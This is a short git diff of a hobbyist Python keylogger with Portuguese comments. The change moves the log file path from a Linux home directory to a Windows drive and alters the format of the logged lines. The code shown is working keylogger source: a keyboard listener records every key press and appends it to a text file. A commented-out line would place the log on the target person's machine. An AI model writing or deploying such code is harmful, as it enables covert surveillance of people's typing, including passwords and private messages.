@@ -7,7 +7,7 @@ import logging
 from shutil import copyfile
 
 # definindo o local para salvar o arquivo
-logFile = "/home/lucas/Projects/KeyLogger/logger.txt"
+logFile = "E:\Programação\KeyLogger\logger.txt"
 
 # Definindo o local usando o PC da pessoa
 # username = os.getlogin()
@@ -25,12 +25,13 @@ def writeLog(key):
 
     # abrindo o arquivo para adicionar o que foi precionando. Usando o "append" para adicionar uma nova linha
     with open(logFile, "a") as f:
-        f.write(keydata)
+        f.write(f'A teclada por: {keydata}\n')
 
 # abrindo o LIstener para registrar as teclas quanto precionar
 # quando o evendo on_press ocorrer, chamar função WriteLog
 with Listener(on_press=writeLog) as l:
     l.join()
-
 # usando o: tail -f /home/lucas/Projects/KeyLogger/logger.txt
 # você acompanha o arquivo
+
+# Teste aqui: 
